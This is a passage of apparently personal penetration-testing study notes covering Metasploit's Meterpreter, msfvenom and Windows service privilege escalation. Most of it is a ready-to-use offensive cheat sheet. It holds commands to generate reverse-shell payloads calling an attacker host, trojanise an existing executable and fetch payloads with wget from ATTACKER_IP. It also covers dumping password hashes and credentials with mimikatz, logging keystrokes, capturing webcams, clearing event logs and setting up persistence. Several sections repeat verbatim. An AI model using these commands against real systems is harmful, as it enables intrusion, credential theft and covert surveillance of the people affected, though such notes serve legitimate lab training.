- By default meterpreter 
  `powershell.exe x86 User-PC\User C:\Windows\SysWOW64\WindowsPowershell\v1.0\powershell.exe`
- look for a process
  ` 2244  488   taskeng.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\taskeng.exe`

| Option                    | Description          |
| ------------------------- | -------------------- |
| `migrate -N PROCESS_NAME` | Using the name       |
| `migrate PID_NUMBER`      | Using the PID number |
## Hashdump
- will **list** the content of the **[[SAM\|SAM]] database**
- These hashes can also be used in [[Pass-the-Hash\|Pass-the-Hash]] attacks
## Search
- useful to locate **files with** potentially **juicy information**
- In a CTF context, this can be used to quickly **find a flag or proof file,**
- In penetration testing engagements, may need to search for **user-generated files** or c**onfiguration files** that may contain **password or account information.**
```shell-session
search -f flag2.txt
```
## Shell
- Launch a regular command-line shell on the target system
- CTRL+Z will help you go back to the Meterpreter shell.
```sh
shell
```
## powershell
Get a powershell on meterpreter
```shell
load powershell
powershell_shell
```

## Persistence
Background
```shell
use exploit/windows/local/persistence_service
use exploit/windows/local/persistence
```
- Use 
`windows/x64/shell/reverse_https`

Forground
```shell
run exploit/windows/local/persistence args1[val1] args2[val2]
```
## Crack hash
```shell
use auxiliary/analize/jtr_crack_fast
```

## Enumerating gathering
### Windows
To run all below
```shell
run winenum
```

Aplications in the computer
```shell
use  post/windows/gather/enum_applications
set session 47
```
Devices, peripheral
```shell
use post/windows/gather/enum_devices
set session 47
```
Files
```shell
use post/windows/gather/enumfiles
```
Internet explorer
```shell
use post/windows/gather/enum_ie
```
Users
```shell
use post/windows/gather/enum_logged_on_users
```
Licenses
```shell
use post/windows/gather/enum_ms_product_keys
```
Browsers history (malicious pages xx)
```shell
use post/windows/gather/browser_history
```
Drivers (write permissions)
```shell
use post/windows/gather/forensics/enum_drivers
```
Environment variables
```shell
use post/multi/gather/env
```
Hashdump
```shell
use post/windows/gather/hashdump
```
Hashdump after trying  escalate
```shell
use post/windows/gather/smart_hashdump
```
### Linux
```shell
use post/linux/gather/enum_configs
use post/linux/gather/enum_network
use post/linux/gather/enum_users_history
use post/linux/gather/enum_protections
use post/linux/busybox/enum_connections
use post/linux/gather/hashdump
```
# Extensions
To show list of extensions
```sh
use -l
```
## stdapi
- Default
## Single sign on credential collector
```shell
use post/windows/gather/credential/sso
```
### kiwi mimikatz
 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



- To windows
- On recent versions are parched
- Password dumping tool

| Option                                            | Description                                                 |
| ------------------------------------------------- | ----------------------------------------------------------- |
| `load kiwi`                                       | Load                                                        |
| `creds_all`                                       | Retrieve all credentials (parsed)                           |
| `lsa_dump_secrets`                                | Dump LSA secrets (unparsed)                                 |
| `lsa_dump_sam`                                    | Dump LSA SAM (unparsed)                                     |
| `golden_ticket_create`                            | Create a golden kerberos ticket to [[Golden ticket attack\|Golden ticket attack]] |
| `password_change -u user -n hashNTLM -P password` | Change the password/hash of a user                          |
When use `creds_all` allows us to steal this password out of memory even without the user 'Dark' logged in **if a scheduled task** runs the Icecast as the user 'Dark'.

</div></div>

# Some modules
## To scan vuln on windows
```shell
run multi/recon/local_exploit_suggester
```
## Enable [[RDP\|RDP]]
```shell
run post/windows/manage/enable_rdp
```


</div></div>


# Encoders
- Encoders **do not aim to bypass antivirus** installed on the target system
- **Encode** the payload.
- Can be effective against **some antivirus** software
- Use with `-e`

| Option         | Description                                                 |
| -------------- | ----------------------------------------------------------- |
| `-f <format>`  | Specifies the output format.                                |
| `-o <file>`    | The output location and filename for the generated payload. |
| `LHOST=<IP>`   | Specifies the IP to connect back to.                        |
| `LPORT=<port>` | The port on the local machine to connect back to.           |
| `--platform`   | specificity paltorm                                         |
| `-a`           | specificity arch                                            |
| `-i 10`        | Interate, times to encode                                   |
| `-e`           | Especify the encoder method                                 |
The PHP version of Meterpreter was **encoded in Base64**, and the output format was `raw`.
Staged
``` shell
msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.186.44 LPORT=47 -f raw -e php/base64
```

 To get access with [[Notes/Netcat\|Netcat]] 
``` shell
msfvenom -p php/shell/reverse_tcp LHOST=10.10.186.44 LPORT=47 -f raw -e php/base64
```
# FIle templates
- Set payload into a existent file
- Doesn't work on all programs

| Option   | Description                                |
| -------- | ------------------------------------------ |
| `-x`     | Set the original program                   |
| `--keep` | Try to keep the original app functionality |
Windows
```shell
msfvemon -p windows/meterpreter/reverse_tcp LHOST=X.X.X.X LPORT=4747 -e x86/shikata_ga_nai -i 25 -x original_app.exe --keep -f exe -o new_app.exe
```

# 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



- Like socat and netcat
- used to **receive reverse shells.**
- fully-fledged way to obtain stable shells
- with a wide variety of further options to improve the caught shell.
- only way to interact with a _meterpreter_ shell
- the easiest way to handle _staged_ payloads
- Reverse shells or Meterpreter callbacks generated in your MSFvenom payload can be easily caught using a handler.
``` shell
use exploit/multi/handler
```
set the payload value (`php/reverse_php` in this case), the LHOST, and LPORT values.
`php/meterpreter/reverse_tcp`
```bash
set payload php/reverse_php
setg LHOST 192.x.x.x
setg LPORT 47
```

Example to DVWA (Damn Vulnerable Web Application)
``` sh
set payload php/reverse_php
set lhost 10.0.2.19
set lport 7777
run
```

send seasson to background
```
background
```

Start a listener in the background
```sh
exploit -j
```
Then we needed to use `sessions 1` to foreground it again.


</div></div>


</div></div>

Move to the folder.
```powershell
move C:\Users\thm-unpriv\rev-svc2.exe C:\MyPrograms\Disk.exe
```
Grant full permissions to the Everyone group as well:
```powershell
icacls Disk.exe /grant Everyone:F
```
Start a revershell listener on attacker machine.
And restart the service. (In a normal case you would likely have to wait for a service restart)
```powershell
sc stop "disk sorter enterprise"
sc start "disk sorter enterprise"
```
> [!note]
 PowerShell has `sc` as an alias to `Set-Content`, therefore you need to use `sc.exe` in order to control services with PowerShell this way.



</div></div>


### 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">

<div class="markdown-embed-title">

### Insecure Permissions on Service Executable

</div>


- If the **executable** associated with a service **has weak permissions** that allow an attacker to modify or replace it, the attacker can **gain** the **privileges** of the service's account trivially.

Example
```cmd
sc qc WindowsScheduler
```
```powershell
sc.exe qc WindowsScheduler
```
![Pasted image 20240821083409.png|600](/img/user/Pasted%20image%2020240821083409.png)
Check permissions with `icalcs`
```shell-session
icacls C:\PROGRA~2\SYSTEM~1\WService.exe
```
![Pasted image 20240821083627.png|600](/img/user/Pasted%20image%2020240821083627.png)
The everyone group has modify permissions `(M)` on the service's executable.
We can overwrite it with any payload.
Generate an exe-service payload using [[Metasploit/Msfvenom\|msfvenom]]

<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



- Generate payloads
- Access all payloads available in the Metasploit framework.
- Create payloads in many different formats (PHP, exe, dll, elf, , aspx, .war, .py, etc.)
- Different target systems (Apple, Windows, Android, Linux, etc.).
- Used extensively in **lower-level exploit** development to generate **hexadecimal shellcode** when developing something like a **Buffer Overflow exploit**

| Option                                               | Description                                         |
| ---------------------------------------------------- | --------------------------------------------------- |
| `msfvenom -l payloads`                               | Show payloads                                       |
| `msfvenom --list payloads`                           | list supported output formats                       |
| `msfvenom -p payload`                                | Select a payload                                    |
| `msfvenom -p cmd/unix/reverse_netcat --list-options` | List options                                        |
| `R`                                                  | Set `R` at final of code is to specify reverseshell |

```shell
payload options
```
```sh
msfvenom --list payloads
```
```sh
msfvenom -s linux/x64/meterpreter/reverse_tcp LHOST=10.10.10.5 LPORT=443
```
# Non staged - Single
- send payload in 1 file
- easier to use and catch
- easier for an antivirus or intrusion detection program to discover and remove.
- Stageless payloads are denoted with underscores (`_`)
# Stages
- send payload in some files or parts
- harder to use,
- **first part** is called the _stager_
- executed directly on the server itself.
- It connects back to a waiting listener, but doesn't actually contain any reverse shell code by itself.
- preventing it from touching the disk where it could be caught by traditional anti-virus solutions.
- connects to the listener and uses the connection **to load the real payload**
- Thus the payload is **split** into **two parts**
	- a small **initial stager**
	- then the bulkier **reverse shell code** which is downloaded when the stager is activated
- Staged payloads require a special listener, usually the Metasploit Multihandler
- Modern day antivirus solutions will also make use of the [[AMSI\|AMSI]] to detect the payload
- are denoted with another forward slash (`/`).
# **Output formats**
```
msfvenom --list formats
```

# Payloads
## Payload Naming Conventions
```sh
<OS>/<arch>/<payload>
```

Stageless reverse shell for an x86 Linux target
```sh
linux/x86/shell_reverse_tcp
```

Windows 32bit targets
- exception, the arch is not specified
```sh
windows/shell_reverse_tcp
```
## Reverse payloads
- you will need to **have the** exploit/multi/**handler module listening** on your attacking machine to work as a handler
- You will need to set up the handler accordingly with the payload, LHOST and LPORT parameters.
- These values will be the same you have used when creating the msfvenom payload.

| Option                                                                                          | Description |
| ----------------------------------------------------------------------------------------------- | ----------- |
| `msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f exe > rev_shell.exe` | Windows     |
| `msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f asp > rev_shell.asp` | ASP         |
| `msfvenom -p cmd/unix/reverse_python LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.py`          | Python      |
| `msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.php`     | PHP         |
| `msfvenom -p cmd/unix/reverse_netcat lhost=LOCALIP lport=8888 R`                                | Unix        |
Linux - Executable and Linkable Format (elf)
- staged
```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f elf > rev_shell.elf
```
- The .elf format is comparable to the .exe format in Windows
```bash
chmod +x shell.elf
./shell.elf
```

### Windows
Exe-service
- Exe-service payload and serve it through a python webserver:
```shell
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4747 -f exe-service -o rev-svc.exe

python3 -m http.server
```
- Pull the payload from Powershell
```powershell
wget http://ATTACKER_IP:4848/rev-svc.exe -O rev-svc.exe
```

Windows reverse tcp (staged)
``` shell
mfsvenom -p windows/x64/meterpreter/reverse_tcp --platform windows -a x64 LHOST=IP LPORT=47 -f exe -o reverse.exe
```

Windows reverse tcp (non staged)
``` shell
mfsvenom -p windows/x64/meterpreter_reverse_tcp --platform windows -a x64 LHOST=IP LPORT=47 -f exe -o reverse.exe
```
Windows x64 reverse shell, exe format
```sh
msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=<listen-IP> LPORT=<listen-port>
```
### PHP
- The output **PHP file** will miss the starting PHP tag commented and the end tag (`?>`), as seen below.
![Pasted image 20240606180600.png|600](/img/user/Pasted%20image%2020240606180600.png)
- The reverse_shell.php file should be edited to convert it into a working PHP file.
- Below: Comments removed from the beginning of the file.
- End tag added
![Pasted image 20240606180735.png|500](/img/user/Pasted%20image%2020240606180735.png)
![Pasted image 20240606180753.png|400](/img/user/Pasted%20image%2020240606180753.png)

## 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



- Metasploit attack payload
- Metasploit's own brand of fully-featured shell.
- completely stable, making them a **very good thing when working with Windows targets**
- Inbuilt functionality, such as file **uploads** and **downloads**.
- that provides an **interactive shell** from which an attacker can explore the target machine and **execute code.**
- runs on the target system but **is not installed** on it. It **runs in memory**
- It is typically deployed using in-memory DLL injection to reside entirely in **memory**.
- aims to **avoid** being **detected** during **antivirus** scans.
- aims to avoid being detected by network-based [[Networking/Seguridad en redes/Seguridad Perimetral/IPS\|IPS]] and [[Networking/Seguridad en redes/Seguridad Perimetral/IDS\|IDS]]
- The **downside** to meterpreter shells is that they _must_ be caught in Metasploit.
- using **encrypted** communication
- **If** the target organization **does not decrypt and inspect** encrypted **traffic** (e.g. HTTPS) coming to and going out of the local network, IPS and IDS solutions **will not be able to detect** its activities.
- establish an encrypted ([[TLS\|TLS]]) communication channel
- most **antivirus** software **will** **detect it.**
- Run in windows under the `spoolsv.exe` process

| Option                                         | Description                                             |
| ---------------------------------------------- | ------------------------------------------------------- |
| `help`                                         | SHow help                                               |
| `getpid`                                       | Show the [[PID\|PID]]                                        |
| `ps`                                           | list processes running on the system                    |
| `tasklist /m /fi "pid eq 1304"`                | look at DLLs (Dynamic-Link Libraries) used by a process |
| `msfvenom --list payloads \| grep meterpreter` | List type of meterpreter payloads                       |
- some exploits will have a default Meterpreter payload

# Migrate shell to meterpreter
By default upgrade to x32 (x86)
```shell
post/multi/manage/shell_to_meterpreter
```
It possible to modify the ruby code to change to x64
![Pasted image 20241003114902.png](/img/user/attachments/Pasted%20image%2020241003114902.png)
```shell
reload_all
```
# How to decide which payload to use
- The target operating system (Is the target operating system Linux or Windows?
- Components available on the target system (Is Python installed? Is this a PHP website? etc.)
- Network connection types you can have with the target system (Do they allow raw TCP connections? Can you only have an HTTPS reverse connection? Are IPv6 addresses not as closely monitored as IPv4 addresses? etc.)
# Commands
## Core commands

| Option       | Description                                            |
| ------------ | ------------------------------------------------------ |
| `background` | Backgrounds the current session                        |
| `exit`       | Terminate the Meterpreter session                      |
| `guid`       | Get the session GUID (Globally Unique Identifier)      |
| `help`       | Displays the help menu                                 |
| `info`       | Displays information about a Post module               |
| `irb`        | Opens an interactive Ruby shell on the current session |
| `load`       | Loads one or more Meterpreter extensions               |
| `migrate`    | Allows you to migrate Meterpreter to another process   |
| `run`        | Executes a Meterpreter script or Post module           |
| `sessions`   | Quickly switch to another session                      |
## File system commands

| Option                   | Description                                                   |
| ------------------------ | ------------------------------------------------------------- |
| `cd`                     | Will change directory                                         |
| `ls`                     | Will list files in the current directory (dir will also work) |
| `pwd`                    | Prints the current working directory                          |
| `edit`                   | will allow you to edit a file                                 |
| `cat`                    | Will show the contents of a file to the screen                |
| `rm`                     | Will delete the specified file                                |
| `rmdir`                  | Will delete a folder.                                         |
| `search`                 | Will search for files                                         |
| `upload local_path_file` | Will upload a file or directory                               |
| `download`               | Will download a file or directory                             |
## Networking commands

| Option                                     | Description                                                |
| ------------------------------------------ | ---------------------------------------------------------- |
| `arp`                                      | Displays the host ARP (Address Resolution Protocol) cache  |
| `ifconfig`                                 | Displays network interfaces available on the target system |
| `netstat`                                  | Displays the network connections                           |
| `route`                                    | Allows you to view and modify the routing table            |
| `portfwd`                                  | Forwards a local port to a remote service                  |
| `portfwd add -l 8080 -p 80 -r 10.0.2.3`    | lport 8080, rport 80, rhost 10.0.2.3                       |
| `portfwd delete -l 8080 -p 80 -r 10.0.2.3` | Delete                                                     |
| `portfwd list`                             | List porforwarding configs                                 |
## System commands

| Option       | Description                                          |
| ------------ | ---------------------------------------------------- |
| `sysinfo`    | Gets information about the remote system, such as OS |
| `getuid`     | Shows the user that Meterpreter is running as        |
| `clearev`    | Clears the event logs                                |
| `execute`    | Executes a command                                   |
| `getpid`     | Shows the current process identifier                 |
| `kill`       | Terminates a process                                 |
| `pkill`      | Terminates processes by name                         |
| `ps`         | Lists running processes                              |
| `reboot`     | Reboots the remote computer                          |
| `shell`      | Drops into a system command shell                    |
| `shutdown`   | Shuts down the remote computer                       |
| `show_mount` | Show mount drivers                                   |
## Keylogger
| Option          | Description                 |
| --------------- | --------------------------- |
| `keyscan_start` | Starts capturing keystrokes |
| `keyscan_stop`  | tops capturing keystrokes   |
| `keyscan_dump`  | Dumps the keystroke buffer  |
## Sniffer

| Option               | Description     |
| -------------------- | --------------- |
| `use sniffer`        | Use             |
| `sniffer_interfaces` | Show interfaces |
| `snifer_start`       |                 |
| `snifer_stats`       | Show stats      |
| `snifer_stop`        |                 |
| `snifer_dumps`       |                 |
## Webcam

| Option          | Description                                    |
| --------------- | ---------------------------------------------- |
| `webcam_chat`   | Starts a video chat                            |
| `webcam_list`   | Lists webcams                                  |
| `webcam_snap`   | Takes a snapshot from the specified webcam     |
| `webcam_stream` | Plays a video stream from the specified webcam |
## Activity
Get a kit of features, screenshots, webcam, keylogger.

| Option           | Description        |
| ---------------- | ------------------ |
| `load beholder`  | Load               |
| `beholder_start` | Start the beholder |
## Other commands
These will be listed under different menu categories in the help menu

| Option        | Description                                                 |
| ------------- | ----------------------------------------------------------- |
| `idletime`    | Returns the number of seconds the remote user has been idle |
| `screenshare` | Allows you to watch the remote user's desktop in real time  |
| `screenshot`  | Grabs a screenshot of the interactive desktop               |
| `record_mic`  | Records audio from the default microphone for X seconds     |
| `getsystem`   | Attempts to elevate your privilege to that of local system  |
| `hashdump`    | Dumps the contents of the SAM database                      |
| `getprivs`    | Show privileges                                             |
| `timestomp`   | Modify timestamps of files on the system.                   |
| `run vnc`     | Run an [[vnc\|vnc]] in a machine.                                |
# Versions available
- Android
- Apple iOS
- Java
- Linux

| Option                              | Description           |
| ----------------------------------- | --------------------- |
| `linux/x86/meterpreter_reverse_tcp` | Linux 32bit stageless |
- OSX
- PHP
- Python
- Windows

| Option                                | Description                              |
| ------------------------------------- | ---------------------------------------- |
| `windows/x64/meterpreter/reverse_tcp` | Windows 64bit staged Meterpreter payload |
# Post explotation
- `getuid` This will give you an idea of your possible privilege level on the target system - NT AUTHORITY\SYSTEM or a regular user?
- The `ps` command will list running processes. The PID column will also give you the PID information you will need to **migrate Meterpreter to another process.**

## Post explotation Phases
- Gathering further information about the target system.
- Looking for interesting files, user credentials, additional network interfaces, and generally interesting information on the target system.
- Privilege escalation.
- Lateral movement.

## Migrate
- if you see a word processor running on the target (e.g. word.exe, notepad.exe, etc.),
- you can migrate to it and start **capturing keystrokes** sent by the user to this process
- Some Meterpreter versions will offer the `keyscan_start`, or others commands options to make Meterpreter act like a **keylogger**.
- may also help you to have a **more stable** Meterpreter **session**.
- **Alert** you **may lose** your user **privileges** **if you migrate from a higher privileged** (e.g. SYSTEM) user to a process started by a lower privileged user (e.g. webserver). You **may not be able to gain them back.**
- By default meterpreter 
  `powershell.exe x86 User-PC\User C:\Windows\SysWOW64\WindowsPowershell\v1.0\powershell.exe`
- look for a process
  ` 2244  488   taskeng.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\taskeng.exe`

| Option                    | Description          |
| ------------------------- | -------------------- |
| `migrate -N PROCESS_NAME` | Using the name       |
| `migrate PID_NUMBER`      | Using the PID number |
## Hashdump
- will **list** the content of the **[[SAM\|SAM]] database**
- These hashes can also be used in [[Pass-the-Hash\|Pass-the-Hash]] attacks
## Search
- useful to locate **files with** potentially **juicy information**
- In a CTF context, this can be used to quickly **find a flag or proof file,**
- In penetration testing engagements, may need to search for **user-generated files** or c**onfiguration files** that may contain **password or account information.**
```shell-session
search -f flag2.txt
```
## Shell
- Launch a regular command-line shell on the target system
- CTRL+Z will help you go back to the Meterpreter shell.
```sh
shell
```
## powershell
Get a powershell on meterpreter
```shell
load powershell
powershell_shell
```

## Persistence
Background
```shell
use exploit/windows/local/persistence_service
use exploit/windows/local/persistence
```
- Use 
`windows/x64/shell/reverse_https`

Forground
```shell
run exploit/windows/local/persistence args1[val1] args2[val2]
```
## Crack hash
```shell
use auxiliary/analize/jtr_crack_fast
```

## Enumerating gathering
### Windows
To run all below
```shell
run winenum
```

Aplications in the computer
```shell
use  post/windows/gather/enum_applications
set session 47
```
Devices, peripheral
```shell
use post/windows/gather/enum_devices
set session 47
```
Files
```shell
use post/windows/gather/enumfiles
```
Internet explorer
```shell
use post/windows/gather/enum_ie
```
Users
```shell
use post/windows/gather/enum_logged_on_users
```
Licenses
```shell
use post/windows/gather/enum_ms_product_keys
```
Browsers history (malicious pages xx)
```shell
use post/windows/gather/browser_history
```
Drivers (write permissions)
```shell
use post/windows/gather/forensics/enum_drivers
```
Environment variables
```shell
use post/multi/gather/env
```
Hashdump
```shell
use post/windows/gather/hashdump
```
Hashdump after trying  escalate
```shell
use post/windows/gather/smart_hashdump
```
### Linux
```shell
use post/linux/gather/enum_configs
use post/linux/gather/enum_network
use post/linux/gather/enum_users_history
use post/linux/gather/enum_protections
use post/linux/busybox/enum_connections
use post/linux/gather/hashdump
```
# Extensions
To show list of extensions
```sh
use -l
```
## stdapi
- Default
## Single sign on credential collector
```shell
use post/windows/gather/credential/sso
```
### kiwi mimikatz
 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



- To windows
- On recent versions are parched
- Password dumping tool

| Option                                            | Description                                                 |
| ------------------------------------------------- | ----------------------------------------------------------- |
| `load kiwi`                                       | Load                                                        |
| `creds_all`                                       | Retrieve all credentials (parsed)                           |
| `lsa_dump_secrets`                                | Dump LSA secrets (unparsed)                                 |
| `lsa_dump_sam`                                    | Dump LSA SAM (unparsed)                                     |
| `golden_ticket_create`                            | Create a golden kerberos ticket to [[Golden ticket attack\|Golden ticket attack]] |
| `password_change -u user -n hashNTLM -P password` | Change the password/hash of a user                          |
When use `creds_all` allows us to steal this password out of memory even without the user 'Dark' logged in **if a scheduled task** runs the Icecast as the user 'Dark'.

</div></div>

# Some modules
## To scan vuln on windows
```shell
run multi/recon/local_exploit_suggester
```
## Enable [[RDP\|RDP]]
```shell
run post/windows/manage/enable_rdp
```


</div></div>


# Encoders
- Encoders **do not aim to bypass antivirus** installed on the target system
- **Encode** the payload.
- Can be effective against **some antivirus** software
- Use with `-e`

| Option         | Description                                                 |
| -------------- | ----------------------------------------------------------- |
| `-f <format>`  | Specifies the output format.                                |
| `-o <file>`    | The output location and filename for the generated payload. |
| `LHOST=<IP>`   | Specifies the IP to connect back to.                        |
| `LPORT=<port>` | The port on the local machine to connect back to.           |
| `--platform`   | specificity paltorm                                         |
| `-a`           | specificity arch                                            |
| `-i 10`        | Interate, times to encode                                   |
| `-e`           | Especify the encoder method                                 |
The PHP version of Meterpreter was **encoded in Base64**, and the output format was `raw`.
Staged
``` shell
msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.186.44 LPORT=47 -f raw -e php/base64
```

 To get access with [[Notes/Netcat\|Netcat]] 
``` shell
msfvenom -p php/shell/reverse_tcp LHOST=10.10.186.44 LPORT=47 -f raw -e php/base64
```
# FIle templates
- Set payload into a existent file
- Doesn't work on all programs

| Option   | Description                                |
| -------- | ------------------------------------------ |
| `-x`     | Set the original program                   |
| `--keep` | Try to keep the original app functionality |
Windows
```shell
msfvemon -p windows/meterpreter/reverse_tcp LHOST=X.X.X.X LPORT=4747 -e x86/shikata_ga_nai -i 25 -x original_app.exe --keep -f exe -o new_app.exe
```

# 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



- Like socat and netcat
- used to **receive reverse shells.**
- fully-fledged way to obtain stable shells
- with a wide variety of further options to improve the caught shell.
- only way to interact with a _meterpreter_ shell
- the easiest way to handle _staged_ payloads
- Reverse shells or Meterpreter callbacks generated in your MSFvenom payload can be easily caught using a handler.
``` shell
use exploit/multi/handler
```
set the payload value (`php/reverse_php` in this case), the LHOST, and LPORT values.
`php/meterpreter/reverse_tcp`
```bash
set payload php/reverse_php
setg LHOST 192.x.x.x
setg LPORT 47
```

Example to DVWA (Damn Vulnerable Web Application)
``` sh
set payload php/reverse_php
set lhost 10.0.2.19
set lport 7777
run
```

send seasson to background
```
background
```

Start a listener in the background
```sh
exploit -j
```
Then we needed to use `sessions 1` to foreground it again.


</div></div>


</div></div>

Replace the service executable with our payload
```powershell
cd C:\PROGRA~2\SYSTEM~1\

move WService.exe WService.exe.bkp

move C:\Users\thm-unpriv\rev-svc.exe WService.exe
```
Grant full permissions to the Everyone group as well:
```powershell
icacls WService.exe /grant Everyone:F
```
Start a revershell listener on attacker machine.
And restart the service. (In a normal case you would likely have to wait for a service restart)
```powershell
sc stop windowsscheduler
sc start windowsscheduler
```
> [!note]
 PowerShell has `sc` as an alias to `Set-Content`, therefore you need to use `sc.exe` in order to control services with PowerShell this way.



</div></div>

### 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">

<div class="markdown-embed-title">

### Insecure Service Permissions

</div>


- If the **service** [[DACL\|DACL]] **allow** you ti **modify** the **configuration** of a service, we will be able to **reconfigure** the service.
- Pointing to any **executable** to **run** it using any account, including `SYSTEM` itself.

<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



- Check for a **service** [[DACL\|DACL]]
- https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk
Run it on `cmd`
```cmd
accesschk64.exe -qlc thmservice
```

Example:
![Pasted image 20240822181926.png|400](/img/user/Pasted%20image%2020240822181926.png)
- The `BUILTIN\\Users` group has the SERVICE_ALL_ACCESS permission
- Means **any user** can reconfigure the service.

</div></div>

Create the payload

<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



- Generate payloads
- Access all payloads available in the Metasploit framework.
- Create payloads in many different formats (PHP, exe, dll, elf, , aspx, .war, .py, etc.)
- Different target systems (Apple, Windows, Android, Linux, etc.).
- Used extensively in **lower-level exploit** development to generate **hexadecimal shellcode** when developing something like a **Buffer Overflow exploit**

| Option                                               | Description                                         |
| ---------------------------------------------------- | --------------------------------------------------- |
| `msfvenom -l payloads`                               | Show payloads                                       |
| `msfvenom --list payloads`                           | list supported output formats                       |
| `msfvenom -p payload`                                | Select a payload                                    |
| `msfvenom -p cmd/unix/reverse_netcat --list-options` | List options                                        |
| `R`                                                  | Set `R` at final of code is to specify reverseshell |

```shell
payload options
```
```sh
msfvenom --list payloads
```
```sh
msfvenom -s linux/x64/meterpreter/reverse_tcp LHOST=10.10.10.5 LPORT=443
```
# Non staged - Single
- send payload in 1 file
- easier to use and catch
- easier for an antivirus or intrusion detection program to discover and remove.
- Stageless payloads are denoted with underscores (`_`)
# Stages
- send payload in some files or parts
- harder to use,
- **first part** is called the _stager_
- executed directly on the server itself.
- It connects back to a waiting listener, but doesn't actually contain any reverse shell code by itself.
- preventing it from touching the disk where it could be caught by traditional anti-virus solutions.
- connects to the listener and uses the connection **to load the real payload**
- Thus the payload is **split** into **two parts**
	- a small **initial stager**
	- then the bulkier **reverse shell code** which is downloaded when the stager is activated
- Staged payloads require a special listener, usually the Metasploit Multihandler
- Modern day antivirus solutions will also make use of the [[AMSI\|AMSI]] to detect the payload
- are denoted with another forward slash (`/`).
# **Output formats**
```
msfvenom --list formats
```

# Payloads
## Payload Naming Conventions
```sh
<OS>/<arch>/<payload>
```

Stageless reverse shell for an x86 Linux target
```sh
linux/x86/shell_reverse_tcp
```

Windows 32bit targets
- exception, the arch is not specified
```sh
windows/shell_reverse_tcp
```
## Reverse payloads
- you will need to **have the** exploit/multi/**handler module listening** on your attacking machine to work as a handler
- You will need to set up the handler accordingly with the payload, LHOST and LPORT parameters.
- These values will be the same you have used when creating the msfvenom payload.

| Option                                                                                          | Description |
| ----------------------------------------------------------------------------------------------- | ----------- |
| `msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f exe > rev_shell.exe` | Windows     |
| `msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f asp > rev_shell.asp` | ASP         |
| `msfvenom -p cmd/unix/reverse_python LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.py`          | Python      |
| `msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.php`     | PHP         |
| `msfvenom -p cmd/unix/reverse_netcat lhost=LOCALIP lport=8888 R`                                | Unix        |
Linux - Executable and Linkable Format (elf)
- staged
```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f elf > rev_shell.elf
```
- The .elf format is comparable to the .exe format in Windows
```bash
chmod +x shell.elf
./shell.elf
```

### Windows
Exe-service
- Exe-service payload and serve it through a python webserver:
```shell
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4747 -f exe-service -o rev-svc.exe

python3 -m http.server
```
- Pull the payload from Powershell
```powershell
wget http://ATTACKER_IP:4848/rev-svc.exe -O rev-svc.exe
```

Windows reverse tcp (staged)
``` shell
mfsvenom -p windows/x64/meterpreter/reverse_tcp --platform windows -a x64 LHOST=IP LPORT=47 -f exe -o reverse.exe
```

Windows reverse tcp (non staged)
``` shell
mfsvenom -p windows/x64/meterpreter_reverse_tcp --platform windows -a x64 LHOST=IP LPORT=47 -f exe -o reverse.exe
```
Windows x64 reverse shell, exe format
```sh
msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=<listen-IP> LPORT=<listen-port>
```
### PHP
- The output **PHP file** will miss the starting PHP tag commented and the end tag (`?>`), as seen below.
![Pasted image 20240606180600.png|600](/img/user/Pasted%20image%2020240606180600.png)
- The reverse_shell.php file should be edited to convert it into a working PHP file.
- Below: Comments removed from the beginning of the file.
- End tag added
![Pasted image 20240606180735.png|500](/img/user/Pasted%20image%2020240606180735.png)
![Pasted image 20240606180753.png|400](/img/user/Pasted%20image%2020240606180753.png)

## 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



- Metasploit attack payload
- Metasploit's own brand of fully-featured shell.
- completely stable, making them a **very good thing when working with Windows targets**
- Inbuilt functionality, such as file **uploads** and **downloads**.
- that provides an **interactive shell** from which an attacker can explore the target machine and **execute code.**
- runs on the target system but **is not installed** on it. It **runs in memory**
- It is typically deployed using in-memory DLL injection to reside entirely in **memory**.
- aims to **avoid** being **detected** during **antivirus** scans.
- aims to avoid being detected by network-based [[Networking/Seguridad en redes/Seguridad Perimetral/IPS\|IPS]] and [[Networking/Seguridad en redes/Seguridad Perimetral/IDS\|IDS]]
- The **downside** to meterpreter shells is that they _must_ be caught in Metasploit.
- using **encrypted** communication
- **If** the target organization **does not decrypt and inspect** encrypted **traffic** (e.g. HTTPS) coming to and going out of the local network, IPS and IDS solutions **will not be able to detect** its activities.
- establish an encrypted ([[TLS\|TLS]]) communication channel
- most **antivirus** software **will** **detect it.**
- Run in windows under the `spoolsv.exe` process

| Option                                         | Description                                             |
| ---------------------------------------------- | ------------------------------------------------------- |
| `help`                                         | SHow help                                               |
| `getpid`                                       | Show the [[PID\|PID]]                                        |
| `ps`                                           | list processes running on the system                    |
